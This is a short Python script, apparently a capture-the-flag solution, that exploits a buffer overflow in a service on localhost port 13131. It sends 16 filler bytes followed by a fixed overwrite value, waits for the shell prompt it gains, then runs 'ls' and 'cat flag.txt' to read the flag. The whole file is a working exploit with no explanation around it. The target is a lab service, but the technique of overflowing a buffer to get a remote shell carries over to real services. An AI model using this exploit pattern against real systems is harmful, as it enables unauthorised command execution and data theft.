#!/usr/bin/python3
#-*- coding: utf-8 -*-

# buffer overflow exploits
import socket

host = '127.0.0.1'
port = 13131

# connect to server
r = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
r.connect((host,port))

# send 16 "a" and  “\xff\x7f\xec\x1c” as bytes to the server
s = b"a" * 16 + b"\xff\x7f\xec\x1c\n"
r.send(s)
d = r.recv(2048).decode()
print(d)

# wait until the server sends a prompt “$” back
while '$' not in d:
    d = r.recv(2048).decode()
    print(d)

# send "ls" command to server
r.send('ls\n'.encode())
d = r.recv(2048).decode()
print(d)

# wait until the server sends a prompt “$” back
while '$' not in d:
    d = r.recv(2048).decode()
    print(d)

# send "cat flag.txt" command to server
r.send('cat flag.txt\n'.encode())
d = r.recv(2048).decode()
print(d)

